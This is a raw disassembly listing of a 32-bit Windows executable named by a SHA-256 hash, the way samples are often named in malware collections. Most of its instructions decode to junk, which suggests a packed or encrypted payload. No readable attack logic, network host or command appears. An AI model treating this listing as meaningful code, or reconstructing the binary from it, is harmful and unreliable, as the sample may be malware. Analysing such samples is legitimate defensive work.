
1097ea8aa4235bae09e4ea21af4e18c2f9a5ac9d5c107d7901c93d4b8577081d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    eax,DWORD PTR [ebp-0x50]
  401009:	mov    ecx,DWORD PTR [ebp-0x4c]
  40100c:	mov    edx,DWORD PTR [ebp-0x50]
  40100f:	add    DWORD PTR ds:0x428401,0x4284a1
  401019:	sub    eax,edx
  40101b:	mov    DWORD PTR ds:0x428425,ecx
  401021:	push   edi
  401022:	mov    edi,DWORD PTR [ebp-0x4c]
  401025:	mov    DWORD PTR [ebp-0x50],eax
  401028:	not    edx
  40102a:	sbb    ecx,edi
  40102c:	inc    DWORD PTR ds:0x42830d
  401032:	mov    DWORD PTR [ebp-0x4c],ecx
  401035:	or     DWORD PTR [ebp-0x50],0xcb78dc42
  40103c:	sub    DWORD PTR ds:0x428419,ecx
  401042:	or     DWORD PTR [ebp-0x4c],0x9c2b8ae8
  401049:	mov    edx,DWORD PTR ds:0x4283e1
  40104f:	xor    DWORD PTR ds:0x428525,edx
  401055:	mov    eax,DWORD PTR [ebp-0x58]
  401058:	jmp    0x4013f9
  40105d:	(bad)  
  40105e:	mov    edi,0x9098bf8d
  401063:	cwde   
  401064:	(bad)  
  401065:	mov    cl,BYTE PTR [esi+ebp*4-0x31]
  401069:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40106a:	jb     0x4010d6
  40106c:	sar    DWORD PTR [esi-0x42414142],1
  401072:	les    edi,FWORD PTR [esi+0x77aab5be]
  401078:	fst    DWORD PTR [esi]
  40107a:	ds out 0x1f,al
  40107d:	fucomp st(0)
  40107f:	lock sahf 
  401081:	int3   
  401082:	add    eax,0xc5c61f06
  401087:	ffree  st(5)
  401089:	outs   dx,BYTE PTR gs:[esi]
  40108b:	mov    ecx,0x723deed2
  401090:	repnz cmc 
  401092:	adc    al,0x95
  401094:	out    0xc5,eax
  401096:	ss mov cl,0x7e
  401099:	test   DWORD PTR [edx+0xd339a63],esp
  40109f:	repz or BYTE PTR [ecx-0x2c],al
  4010a3:	fisub  WORD PTR [ebx+0x39d2cc4]
  4010a9:	mov    gs,WORD PTR [esi-0x7c]
  4010ac:	mov    esp,0xe03bf4cd
  4010b1:	icebp  
  4010b2:	arpl   WORD PTR ds:0xc4c947e,dx
  4010b8:	call   0x4be36aff
  4010bd:	pop    eax
  4010be:	rcr    bl,1
  4010c0:	inc    esi
  4010c1:	dec    ebp
  4010c2:	shl    DWORD PTR [edx+0x79],0x32
  4010c6:	sub    edi,DWORD PTR [ebx-0x13b6c9c8]
  4010cc:	inc    edx
  4010cd:	lds    esi,FWORD PTR [edx+0x11b8a4d5]
  4010d3:	dec    ecx
  4010d4:	pop    edi
  4010d5:	ret    
  4010d6:	jnp    0x40108a
  4010d8:	cmp    DWORD PTR [ecx],ecx
  4010da:	jle    0x4010fb
  4010dc:	inc    ebx
  4010dd:	call   0x9996abdd
  4010e2:	pop    edx
  4010e3:	xchg   edx,eax
  4010e4:	rcr    BYTE PTR [ebp-0x1f8c23e4],1
  4010ea:	retf   0x3c79
  4010ed:	sub    esi,ebp
  4010ef:	das    
  4010f0:	cmp    edi,DWORD PTR [edx]
  4010f2:	xor    edi,DWORD PTR [edi]
  4010f4:	jge    0x401133
  4010f6:	or     bl,BYTE PTR [esi]
  4010f8:	loopne 0x4010d9
  4010fa:	pop    ebx
  4010fb:	adc    al,0x6d
  4010fd:	inc    ecx
  4010fe:	aam    0x3a
  401100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401101:	outs   dx,DWORD PTR ds:[esi]
  401102:	or     eax,0x84948aa1
  401107:	push   cs
  401108:	add    al,BYTE PTR [ebp-0x34]
  40110b:	pop    ds
  40110c:	xor    edx,edx
  40110e:	xor    eax,0x134945cb
  401113:	dec    edi
  401114:	push   ss
  401115:	pop    es
  401116:	adc    al,0xf8
  401118:	push   ss
  401119:	test   DWORD PTR ds:[ebp+0x49],ebx
  40111d:	xor    al,0x4f
  40111f:	push   eax
  401120:	jmp    0x401170
  401122:	mov    esi,0xf5404bf6
  401127:	ret    0x7788
  40112a:	push   es
  40112b:	sub    BYTE PTR [edx-0x6b4502c8],bh
  401131:	nop
  401132:	nop
  401133:	xor    edx,DWORD PTR [ecx-0x21577cab]
  401139:	dec    ebx
  40113a:	fbstp  TBYTE PTR [ebx+0xf19b4f4]
  401140:	mov    bl,0x18
  401142:	(bad)  
  401143:	(bad)  
  401144:	fldcw  WORD PTR [esi-0x63a7d10a]
  40114a:	pusha  
  40114b:	sbb    BYTE PTR [eax+0x43],0xa7
  40114f:	jmp    0x4010fe
  401151:	push   esi
  401152:	or     al,0xa9
  401154:	arpl   WORD PTR [ecx],sp
  401156:	pusha  
  401157:	(bad)  
  401158:	int3   
  401159:	mov    ch,cl
  40115b:	das    
  40115c:	jp     0x4011af
  40115e:	xchg   edx,eax
  40115f:	pop    ss
  401160:	jecxz  0x401164
  401162:	and    al,0x25
  401164:	fbld   TBYTE PTR [eax-0x15]
  401167:	sub    ebx,DWORD PTR [ebx-0x78c5cba2]
  40116d:	test   al,0xd5
  40116f:	nop
  401170:	addr16 push ecx
  401172:	sbb    cl,BYTE PTR ds:0x8f79669a
  401178:	and    al,0xa6
  40117a:	mov    ecx,0x47aac335
  40117f:	push   esi
  401180:	add    eax,0x961a0d12
  401185:	mov    al,ds:0x29ebd1ad
  40118a:	xchg   ecx,eax
  40118b:	popa   
  40118c:	mov    al,0x87
  40118e:	jbe    0x401129
  401190:	mov    dl,0xe4
  401192:	shl    DWORD PTR [ebx],cl
  401194:	popa   
  401195:	jne    0x4011d0
  401197:	mov    bl,0x7f
  401199:	call   0xbab:0x4dcda4e8
  4011a0:	jge    0x40113a
  4011a2:	push   esp
  4011a3:	mov    esp,0x9c9e68cc
  4011a8:	inc    ecx
  4011a9:	sbb    edx,esp
  4011ab:	inc    ebx
  4011ac:	int3   
  4011ad:	das    
  4011ae:	rol    DWORD PTR [edi+0x318d6e4b],0x29
  4011b5:	shr    BYTE PTR [eax+0x49a32e15],cl
  4011bb:	push   0x6ff2d54f
  4011c0:	xchg   ecx,eax
  4011c1:	sbb    eax,0xd634e38a
  4011c6:	mov    DWORD PTR [ebx+0x791229e4],esp
  4011cc:	xchg   esi,eax
  4011cd:	dec    BYTE PTR [esi+0x35]
  4011d0:	xchg   ebp,eax
  4011d1:	scas   eax,DWORD PTR es:[edi]
  4011d2:	in     al,0x83
  4011d4:	dec    edi
  4011d5:	xor    DWORD PTR [ebx],0x59843279
  4011db:	cli    
  4011dc:	frstor [edi-0x8]
  4011df:	mov    cs,WORD PTR [ebp-0x69]
  4011e2:	test   al,0xa5
  4011e4:	push   cs
  4011e5:	xor    ebx,esp
  4011e7:	lea    ebx,[ebp-0x5d]
  4011ea:	inc    ebx
  4011eb:	mov    ch,0x9f
  4011ed:	lods   al,BYTE PTR ds:[esi]
  4011ee:	add    eax,0xb5aa390d
  4011f3:	sub    BYTE PTR [ecx-0x3557b164],0x60
  4011fa:	inc    esp
  4011fb:	sub    BYTE PTR [ebx-0x72734508],cl
  401201:	inc    esp
  401202:	inc    edx
  401203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401204:	xchg   BYTE PTR [ebx],dl
  401206:	jbe    0x401197
  401208:	xor    bl,BYTE PTR [edx+eiz*4-0x2b]
  40120c:	fldenv [ecx-0x5eacc89b]
  401212:	sar    BYTE PTR ds:0xb87b1b1e,0x5e
  401219:	jg     0x4011ac
  40121b:	cmp    BYTE PTR [ebx+ecx*2+0x74],0x15
  401220:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401221:	xor    ch,BYTE PTR [esi-0xd]
  401224:	inc    ebx
  401225:	icebp  
  401226:	cdq    
  401227:	popf   
  401228:	or     BYTE PTR [ebx+ebx*8],0x8f
  40122c:	ret    
  40122d:	mov    ebx,0x717dd72d
  401232:	mov    ah,al
  401234:	pop    ecx
  401235:	repnz fs scas eax,DWORD PTR es:[edi]
  401238:	pop    ss
  401239:	aaa    
  40123a:	mov    ch,0x6a
  40123c:	in     al,dx
  40123d:	fs arpl bx,cx
  401240:	frstor [ecx+0x222f2b8b]
  401246:	cmovbe esp,ecx
  401249:	mov    BYTE PTR [edx],dh
  40124b:	mov    bl,0x6b
  40124d:	mov    bh,0x80
  40124f:	std    
  401250:	cwde   
  401251:	dec    ebx
  401252:	ins    BYTE PTR es:[edi],dx
  401253:	jae    0x401263
  401255:	ret    0xc958
  401258:	in     eax,0x26
  40125a:	and    bl,BYTE PTR [ecx-0x72162115]
  401260:	ss mov ecx,0x73ea0198
  401266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401267:	sub    al,al
  401269:	and    ebp,DWORD PTR [edi+eax*1]
  40126c:	popa   
  40126d:	loopne 0x40121c
  40126f:	mov    eax,0xb42e440b
  401274:	dec    esp
  401275:	popf   
  401276:	jp     0x4012a7
  401278:	sbb    edx,DWORD PTR [edi+0x66ecf4c9]
  40127e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40127f:	push   ecx
  401280:	dec    edi
  401281:	push   esp
  401282:	dec    esp
  401283:	sub    edi,esp
  401285:	shl    BYTE PTR [esi+ecx*2],cl
  401288:	sub    DWORD PTR [ecx+0x24],edi
  40128b:	jnp    0x401300
  40128d:	in     al,0xdf
  40128f:	adc    edx,0x213a12a6
  401295:	mov    ds:0x38f3a695,al
  40129a:	xchg   ebp,eax
  40129b:	or     edx,ebx
  40129d:	add    dl,BYTE PTR [eax+ebx*2+0xb40f8bb]
  4012a4:	fs mov al,0x9a
  4012a7:	xor    eax,0xbf19f0b2
  4012ac:	jo     0x401308
  4012ae:	push   ecx
  4012af:	jmp    0xcde4ea82
  4012b4:	iret   
  4012b5:	adc    ecx,edi
  4012b7:	jae    0x40129f
  4012b9:	dec    ebp
  4012ba:	and    bh,BYTE PTR [ebp-0x7f]
  4012bd:	imul   DWORD PTR [esi]
  4012bf:	lahf   
  4012c0:	nop
  4012c1:	and    ch,0xef
  4012c4:	imul   eax,edx,0x715763b3
  4012ca:	nop
  4012cb:	cmc    
  4012cc:	and    BYTE PTR [eax+edx*8],0xfa
  4012d0:	adc    bh,BYTE PTR [ebx]
  4012d2:	or     BYTE PTR ds:0xa4db62c,ch
  4012d8:	mov    WORD PTR [ecx],cs
  4012da:	repnz push edx
  4012dc:	test   eax,0x699410cf
  4012e1:	in     al,0xd2
  4012e3:	scas   eax,DWORD PTR es:[edi]
  4012e4:	call   0xd5f7:0x5708441
  4012eb:	outs   dx,BYTE PTR ds:[esi]
  4012ec:	pop    esp
  4012ed:	xchg   ecx,eax
  4012ee:	cdq    
  4012ef:	mov    ch,BYTE PTR [ebp+0x4d]
  4012f2:	lock mov esi,es
  4012f5:	sbb    BYTE PTR [esi+ecx*2+0xb],ah
  4012f9:	xchg   esi,eax
  4012fa:	jmp    0x50ba:0x31f4e76
  401301:	mov    edi,0x5f0e5900
  401306:	sbb    DWORD PTR [ebp-0x6f],esi
  401309:	push   ebp
  40130a:	shr    DWORD PTR [ecx-0xa3f7ef0],cl
  401310:	aas    
  401311:	addr16 int 0xdb
  401314:	inc    ecx
  401315:	push   edx
  401316:	dec    esp
  401317:	mov    esi,DWORD PTR [edx-0x31f5533c]
  40131d:	sub    ebx,esp
  40131f:	adc    al,0xe5
  401321:	adc    BYTE PTR [eax+0x10],bl
  401324:	stc    
  401325:	out    0xa1,eax
  401327:	cmp    al,0x10
  401329:	call   0xaf2b2d38
  40132e:	jecxz  0x401360
  401330:	cmp    BYTE PTR [ecx+0x2a57c94f],0x28
  401337:	and    ecx,DWORD PTR [ecx+0x56]
  40133a:	jo     0x4013a9
  40133c:	adc    edi,esi
  40133e:	addr16 retf 0xc987
  401342:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401343:	inc    ebp
  401344:	or     bl,bh
  401346:	or     esi,ebx
  401348:	push   cs
  401349:	sahf   
  40134a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40134b:	(bad)  
  40134c:	std    
  40134d:	not    BYTE PTR [edx+edi*2-0x67]
  401351:	in     eax,0x61
  401353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401354:	jmp    0xec13e5df
  401359:	jl     0x4013d0
  40135b:	push   edi
  40135c:	sbb    DWORD PTR [eax+0xf041608],0x639f8dfc
  401366:	cmc    
  401367:	scas   eax,DWORD PTR es:[edi]
  401368:	and    ch,dh
  40136a:	and    BYTE PTR [edx],0x5a
  40136d:	loopne 0x4013a8
  40136f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401370:	hlt    
  401371:	add    DWORD PTR [esi+0x46],ebp
  401374:	xchg   esi,eax
  401375:	lods   eax,DWORD PTR ds:[esi]
  401376:	and    al,0x35
  401378:	jmp    0xffe0:0xa82485fd
  40137f:	sahf   
  401380:	dec    ebx
  401381:	ja     0x40134c
  401383:	pop    edi
  401384:	scas   eax,DWORD PTR es:[edi]
  401385:	sbb    edi,DWORD PTR [esp+edi*4-0x72]
  401389:	add    ah,BYTE PTR [eax-0x7c5b629c]
  40138f:	mov    bh,BYTE PTR [edx]
  401391:	cdq    
  401392:	fwait
  401393:	inc    eax
  401394:	inc    ebp
  401395:	dec    ebx
  401396:	cmp    eax,0x4c891004
  40139b:	mov    ch,0xe9
  40139d:	jecxz  0x40137c
  40139f:	sbb    BYTE PTR [edi],ch
  4013a1:	cmp    eax,0xa13c6928
  4013a6:	fidiv  WORD PTR [ecx]
  4013a8:	psubusw mm1,QWORD PTR [ecx+0x4]
  4013ac:	or     DWORD PTR [edx],esi
  4013ae:	sti    
  4013af:	cdq    
  4013b0:	fs mov cl,0xbb
  4013b3:	dec    ebx
  4013b4:	add    bl,bl
  4013b6:	mov    esi,0x5d4a3261
  4013bb:	lods   eax,DWORD PTR ds:[esi]
  4013bc:	pop    ebx
  4013bd:	jb     0x40141c
  4013bf:	jne    0x40137f
  4013c1:	inc    esi
  4013c2:	mov    ds:0x677c38e3,al
  4013c7:	mov    edx,0x328b3119
  4013cc:	push   edx
  4013cd:	xlat   BYTE PTR ds:[ebx]
  4013ce:	dec    ebp
  4013cf:	outs   dx,DWORD PTR ds:[esi]
  4013d0:	add    eax,0xf64aea40
  4013d5:	jmp    0x7bd1a709
  4013da:	out    0x7e,al
  4013dc:	and    dh,BYTE PTR [ebx-0x4be21af1]
  4013e2:	out    dx,eax
  4013e3:	mov    dl,0x67
  4013e5:	or     edi,eax
  4013e7:	stos   BYTE PTR es:[edi],al
  4013e8:	mov    DWORD PTR [ebp+0x7],ebp
  4013eb:	jne    0x4013fc
  4013ed:	mov    edx,0x1c9ac73e
  4013f2:	scas   al,BYTE PTR es:[edi]
  4013f3:	call   0xd00a382d
  4013f8:	arpl   WORD PTR [ebx+0x3d03ac4d],cx
  4013fe:	add    DWORD PTR [edx+eax*2-0x57aa7500],0x84990d19
  401409:	inc    edx
  40140a:	add    BYTE PTR [ebx+0x2d81ac7d],cl
  401410:	and    eax,0x12004285
  401415:	sbb    BYTE PTR [eax],al
  401417:	add    BYTE PTR [ebx],ch
  401419:	ret    0xb60f
  40141c:	adc    eax,0x428411
  401421:	jmp    0x4017c2
  401426:	test   BYTE PTR [edx+0x7cbcfc08],0x3a
  40142d:	mov    WORD PTR [esi+0x6e],es
  401430:	rcl    DWORD PTR [eax-0x1c6367f6],cl
  401436:	mov    ebp,0xbdbebec4
  40143b:	les    edi,FWORD PTR [esi+0x300f25be]
  401441:	xchg   edx,eax
  401442:	int3   
  401443:	das    
  401444:	mov    ebp,edi
  401446:	lods   al,BYTE PTR ds:[esi]
  401447:	jns    0x40143e
  401449:	add    ebp,0x31d3d1dc
  40144f:	call   0x49f3b4b0
  401454:	ins    BYTE PTR es:[edi],dx
  401455:	pop    es
  401456:	rcr    DWORD PTR [edi-0x27],1
  401459:	lock les esp,FWORD PTR [ecx]
  40145c:	pop    DWORD PTR [edx]
  40145e:	mov    al,0xd5
  401460:	jmp    DWORD PTR [esi-0x3]
  401463:	daa    
  401464:	jmp    0x4014e2
  401466:	mov    ebp,0xc24ea41f
  40146b:	xor    esp,ecx
  40146d:	xor    edx,DWORD PTR [eax]
  40146f:	push   ds
  401470:	inc    edi
  401471:	mov    ecx,0x4943964e
  401476:	call   0x35ae3412
  40147b:	dec    ebp
  40147c:	jb     0x4014d9
  40147e:	or     ebx,edx
  401480:	pusha  
  401481:	das    
  401482:	adc    ebp,DWORD PTR [edi+0x7e9806a1]
  401488:	jle    0x401507
  40148a:	mov    DWORD PTR [ecx+ecx*1+0x171ade45],esi
  401491:	mov    BYTE PTR ds:0xd31b8e2,bl
  401497:	add    BYTE PTR gs:[edx-0x46],ah
  40149b:	repnz lahf 
  40149d:	xchg   esp,eax
  40149e:	fwait
  40149f:	test   al,0x3b
  4014a1:	ins    DWORD PTR es:[edi],dx
  4014a2:	inc    esi
  4014a3:	in     al,dx
  4014a4:	(bad)  
  4014a6:	out    0x4f,al
  4014a8:	(bad)  
  4014a9:	fdivr  DWORD PTR [esi-0x41]
  4014ac:	jle    0x401498
  4014ae:	stos   DWORD PTR es:[edi],eax
  4014af:	sub    al,0x73
  4014b1:	retf   
  4014b2:	mov    ds:0xca57148,eax
  4014b7:	sbb    DWORD PTR [ebx-0x40583499],edx
  4014bd:	jg     0x4014ac
  4014bf:	or     eax,0x17fa1a4c
  4014c4:	sbb    eax,0x67ef714
  4014c9:	fs int3 
  4014cb:	dec    ebp
  4014cc:	es mov dl,0x3a
  4014cf:	inc    ebp
  4014d0:	mov    DWORD PTR [esi+0x1a],edi
  4014d3:	push   es
  4014d4:	repnz inc eax
  4014d6:	add    bl,BYTE PTR [eax-0x4a]
  4014d9:	lods   eax,DWORD PTR ds:[esi]
  4014da:	lahf   
  4014db:	pop    ebx
  4014dc:	push   ds
  4014dd:	cmp    ebp,DWORD PTR [edi+eax*8+0xe]
  4014e1:	xchg   DWORD PTR [esi],edx
  4014e3:	adc    al,0xd2
  4014e5:	push   edx
  4014e6:	pop    ebx
  4014e7:	cdq    
  4014e8:	mov    ch,0x3a
  4014ea:	xor    al,0x57
  4014ec:	push   ss
  4014ed:	pop    edx
  4014ee:	mov    bh,BYTE PTR ds:0x51a0ae84
  4014f4:	push   esp
  4014f5:	and    DWORD PTR [edx],esp
  4014f7:	mov    ds:0x8ab3bf0c,al
  4014fc:	push   edx
  4014fd:	(bad)  
  4014fe:	retf   0xb44c
  401501:	inc    eax
  401502:	xchg   ecx,eax
  401503:	test   BYTE PTR [ecx],bl
  401505:	jg     0x4014b2
  401507:	and    DWORD PTR [esp+ebx*8-0x8cad2cd],ebp
  40150e:	mov    esp,0x30fb9b1b
  401513:	dec    ebx
  401514:	xchg   edi,eax
  401515:	call   0xa7266c0b
  40151a:	(bad)  
  40151b:	push   edx
  40151c:	jae    0x4014b8
  40151e:	dec    eax
  40151f:	icebp  
  401520:	fcomp  QWORD PTR [ecx+edx*1+0x5d]
  401524:	cli    
  401525:	xchg   esp,eax
  401526:	sub    DWORD PTR [edi-0x4d7beafb],ebx
  40152c:	ins    BYTE PTR es:[edi],dx
  40152d:	lock pusha 
  40152f:	mov    ebx,0xdef41ba5
  401534:	jle    0x40150f
  401536:	and    al,0x44
  401538:	out    0xb5,al
  40153a:	sub    al,0xf1
  40153c:	sub    al,0xea
  40153e:	jno    0x4015a1
  401540:	jge    0x40156b
  401542:	inc    ebp
  401543:	clc    
  401544:	xchg   ebp,eax
  401545:	push   ebp
  401546:	dec    edx
  401547:	(bad)  
  401548:	mov    ds:0x3f88a61b,eax
  40154d:	popf   
  40154e:	pop    esi
  40154f:	dec    esi
  401550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401551:	cmp    ebp,ebp
  401553:	or     dh,BYTE PTR [ecx+esi*1]
  401556:	rcl    BYTE PTR [esi],0xce
  401559:	push   esp
  40155a:	mov    ch,0x74
  40155c:	xchg   ebx,eax
  40155d:	mov    bh,0xd5
  40155f:	dec    edx
  401560:	adc    eax,0xb6c04e60
  401565:	test   BYTE PTR [esi-0x70],0x3
  401569:	and    DWORD PTR [edx+0x880dc74],esi
  40156f:	mov    dh,BYTE PTR [esi+eiz*8+0x5e8e0cb]
  401576:	(bad)  
  401577:	adc    eax,0x18504455
  40157c:	mov    ecx,0x51653aa1
  401581:	xor    eax,0x2b505737
  401586:	or     esp,0xffffff94
  401589:	outs   dx,BYTE PTR ds:[esi]
  40158a:	adc    DWORD PTR [eax+esi*2],esi
  40158d:	fdiv   DWORD PTR [edx]
  40158f:	push   es
  401590:	add    DWORD PTR cs:0x1d320ad4,esp
  401597:	fstp   DWORD PTR [ebx+0xa]
  40159a:	or     DWORD PTR [ecx+0x642a0e6f],0xffffffcb
  4015a1:	push   es
  4015a2:	mov    cs,edi
  4015a4:	pushf  
  4015a5:	jnp    0x4015e4
  4015a7:	jmp    FWORD PTR [edx+0x5ca06ca0]
  4015ad:	fwait
  4015ae:	(bad)  
  4015af:	pop    eax
  4015b0:	xor    esi,DWORD PTR [eax]
  4015b2:	mov    WORD PTR [edi+0x63182382],es
  4015b8:	cmp    BYTE PTR [esi-0x6683bcd8],dh
  4015be:	push   0xa90c361e
  4015c3:	jl     0x401609
  4015c5:	lock ss ss xchg ebp,eax
  4015c9:	(bad)  
  4015ca:	cli    
  4015cb:	mov    ah,0xa
  4015cd:	dec    edi
  4015ce:	scas   al,BYTE PTR es:[edi]
  4015cf:	sub    al,0xd1
  4015d1:	dec    eax
  4015d2:	cs cld 
  4015d4:	dec    ecx
  4015d5:	mov    al,ds:0xd7452485
  4015da:	scas   al,BYTE PTR es:[edi]
  4015db:	adc    eax,0x7844ba92
  4015e0:	imul   DWORD PTR [ecx-0xc]
  4015e3:	imul   ebx,DWORD PTR [ecx+0x509e40d7],0xf3031a65
  4015ed:	adc    dh,BYTE PTR ds:0xdbfb4a74
  4015f3:	das    
  4015f4:	test   al,0x8f
  4015f6:	jp     0x4015ed
  4015f8:	int3   
  4015f9:	pop    ebp
  4015fa:	rcl    DWORD PTR [edi+0x4],cl
  4015fd:	mov    ah,0xe8
  4015ff:	xor    BYTE PTR [edi-0x2d41df09],ah
  401605:	int3   
  401606:	pop    ecx
  401607:	mov    edi,ebx
  401609:	fistp  QWORD PTR [edx+0x4ba7bfba]
  40160f:	add    esi,DWORD PTR [edx+0x144fd6f5]
  401615:	xchg   DWORD PTR [edx-0xf9a218f],eax
  40161b:	add    al,0x81
  40161d:	call   0xeb5c:0xc485566a
  401624:	out    0x23,eax
  401626:	push   edi
  401627:	iret   
  401628:	sub    bl,ah
  40162a:	mov    ecx,DWORD PTR [esi-0x42]
  40162d:	dec    esi
  40162e:	jae    0x4015f9
  401630:	ret    0x4197
  401633:	xchg   ebx,eax
  401634:	test   al,0x49
  401636:	imul   eax,DWORD PTR [edx+0x68],0xbe8b4932
  40163d:	pop    ebp
  40163e:	add    cl,bl
  401640:	xchg   BYTE PTR [edx+0x45],dh
  401643:	xchg   ebp,eax
  401644:	aad    0x8a
  401646:	add    al,dh
  401648:	ja     0x4015de
  40164a:	jnp    0x401601
  40164c:	ins    DWORD PTR es:[edi],dx
  40164d:	outs   dx,DWORD PTR ds:[esi]
  40164e:	imul   esp
  401650:	pop    edx
  401651:	mov    dl,0xe1
  401653:	imul   ecx,ebx,0x330ad400
  401659:	or     ebp,edx
  40165b:	xor    al,0xde
  40165d:	int3   
  40165e:	std    
  40165f:	call   0xcfd126bc
  401664:	inc    ecx
  401665:	mov    ch,0xb6
  401667:	xchg   edi,eax
  401668:	push   edi
  401669:	inc    edx
  40166a:	mov    edi,0x842dac7f
  40166f:	ror    edi,1
  401671:	ret    
  401672:	push   0x7d
  401674:	fst    DWORD PTR [edx+eax*8-0x17]
  401678:	ret    
  401679:	add    DWORD PTR [esi],eax
  40167b:	je     0x401626
  40167d:	lods   al,BYTE PTR ds:[esi]
  40167e:	sar    DWORD PTR [edx-0x1e],1
  401681:	or     bl,BYTE PTR [edi]
  401683:	mov    DWORD PTR [esi],ebx
  401685:	and    bl,bh
  401687:	mov    bh,0x5c
  401689:	sbb    eax,0xd610568a
  40168e:	mov    esp,0x60a2b7d5
  401693:	loop   0x4016cd
  401695:	out    dx,al
  401696:	ins    DWORD PTR es:[edi],dx
  401697:	add    DWORD PTR [edx],0xffffff91
  40169a:	das    
  40169b:	mov    al,0xa8
  40169d:	repz retf 
  40169f:	and    ebx,DWORD PTR [eax]
  4016a1:	icebp  
  4016a2:	out    0xc3,eax
  4016a4:	js     0x401652
  4016a6:	sbb    al,BYTE PTR [edi+0x24a2064b]
  4016ac:	and    ebp,esp
  4016ae:	xchg   edi,eax
  4016af:	(bad)  
  4016b0:	fstp   TBYTE PTR [esi]
  4016b2:	popa   
  4016b3:	jae    0x401715
  4016b5:	sbb    al,0x6c
  4016b7:	xlat   BYTE PTR ds:[ebx]
  4016b8:	dec    ebx
  4016b9:	les    ebx,FWORD PTR [edx+ebp*2-0x31705930]
  4016c0:	jbe    0x40167e
  4016c2:	jle    0x401735
  4016c4:	inc    edx
  4016c5:	inc    ecx
  4016c6:	inc    edi
  4016c7:	xor    BYTE PTR [eax+0x7af88bd8],ah
  4016cd:	int3   
  4016ce:	fwait
  4016cf:	dec    edx
  4016d0:	mov    esi,0x889fb1ec
  4016d5:	fcmovnbe st,st(4)
  4016d7:	xor    edi,ebp
  4016d9:	je     0x4016c2
  4016db:	retf   
  4016dc:	popf   
  4016dd:	xchg   edx,eax
  4016de:	mov    dh,0x4c
  4016e0:	inc    ebp
  4016e1:	iret   
  4016e2:	or     eax,0x7570922d
  4016e7:	rcl    DWORD PTR [edi-0x77],1
  4016ea:	adc    eax,0xbb02d8a0
  4016ef:	in     al,dx
  4016f0:	sar    BYTE PTR [ebp-0x61],0x83
  4016f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016f5:	arpl   cx,bx
  4016f7:	jecxz  0x4016b1
  4016f9:	adc    BYTE PTR [eax-0x30],bh
  4016fc:	dec    esi
  4016fd:	pop    edx
  4016fe:	fst    DWORD PTR [ecx+edx*2]
  401701:	addr16 and al,0x19
  401704:	inc    ebp
  401705:	pop    eax
  401706:	and    dh,cl
  401708:	stos   BYTE PTR es:[edi],al
  401709:	es aam 0xff
  40170c:	lea    edi,[esi+0x69cf18dc]
  401712:	cmp    al,0x72
  401714:	call   0x1ede:0x5fa48215
  40171b:	in     eax,dx
  40171c:	add    ch,BYTE PTR ds:0x4ecd6a76
  401722:	add    al,BYTE PTR [esi+0x44]
  401725:	int    0xe2
  401727:	cmc    
  401728:	xchg   esi,eax
  401729:	mov    ebp,0x9ed46844
  40172e:	inc    esp
  40172f:	loopne 0x4016eb
  401731:	and    BYTE PTR [ecx],0xfe
  401734:	stos   DWORD PTR es:[edi],eax
  401735:	sub    cl,cl
  401737:	pop    esp
  401738:	add    ch,BYTE PTR [esi+edx*1+0x39c5f1e6]
  40173f:	in     eax,0x74
  401741:	jecxz  0x401746
  401743:	or     eax,0x756f1946
  401748:	mov    ch,0x5a
  40174a:	cmp    BYTE PTR [ebx+eiz*4+0x4305f54c],0x67
  401752:	cmc    
  401753:	dec    eax
  401754:	cmp    edi,ebp
  401756:	xchg   esp,eax
  401757:	rol    DWORD PTR [ecx],1
  401759:	stos   DWORD PTR es:[edi],eax
  40175a:	cld    
  40175b:	ror    dl,0xb1
  40175e:	add    DWORD PTR [ebx],ecx
  401760:	xchg   edi,eax
  401761:	je     0x4016e5
  401763:	mov    esp,0x61689765
  401768:	jl     0x4017a7
  40176a:	mov    bh,0x31
  40176c:	push   ecx
  40176d:	xor    dl,0xe
  401770:	sar    BYTE PTR [edi-0xe24ed6c],cl
  401776:	inc    eax
  401777:	hlt    
  401778:	pop    edi
  401779:	mov    ds,ebp
  40177b:	es and eax,0xf9f11b03
  401781:	imul   eax,DWORD PTR [ebp-0x80],0xffffffae
  401785:	clc    
  401786:	jp     0x4017c4
  401788:	add    al,0x1a
  40178a:	inc    ebx
  40178b:	imul   esp,ebx,0xcedca65d
  401791:	mov    dl,0x81
  401793:	(bad)  
  401794:	dec    edx
  401795:	and    al,0x49
  401797:	(bad)  
  401798:	sbb    eax,0x3f6c1583
  40179d:	sbb    al,0x44
  40179f:	inc    ebx
  4017a0:	adc    BYTE PTR [ebx+0x60ed42a1],bh
  4017a6:	out    0xe0,al
  4017a8:	fisub  DWORD PTR [ecx-0x76]
  4017ab:	fld    st(6)
  4017ad:	aam    0xa8
  4017af:	cmp    al,0x4e
  4017b1:	mov    edi,0x5f89018e
  4017b6:	pop    ebx
  4017b7:	lock xchg DWORD PTR [edi+0x797ee8f4],eax
  4017be:	aam    0xb1
  4017c0:	ror    BYTE PTR [ebp-0x77],cl
  4017c3:	inc    ebp
  4017c4:	test   al,0x1b
  4017c6:	iret   
  4017c7:	mov    DWORD PTR [ebp-0x54],ecx
  4017ca:	or     ecx,0x1b77
  4017d0:	or     DWORD PTR [ebp-0x58],0xcb78a05a
  4017d7:	adc    DWORD PTR ds:0x428401,edi
  4017dd:	or     DWORD PTR [ebp-0x54],0x9c2b8ae8
  4017e4:	lea    eax,[ebp+0x20]
  4017e7:	cmp    DWORD PTR ds:0x4283f9,0x0
  4017ee:	mov    edi,DWORD PTR ds:0x428515
  4017f4:	movzx  ecx,WORD PTR ds:0x428309
  4017fb:	mov    ecx,0x7757
  401800:	jmp    0x401860
  401805:	mov    ecx,0x59da
  40180a:	cmp    DWORD PTR ds:0x4283f9,0x0
  401811:	ja     0x401846
  401817:	push   0x428245
  40181c:	call   DWORD PTR ds:0x42e09c
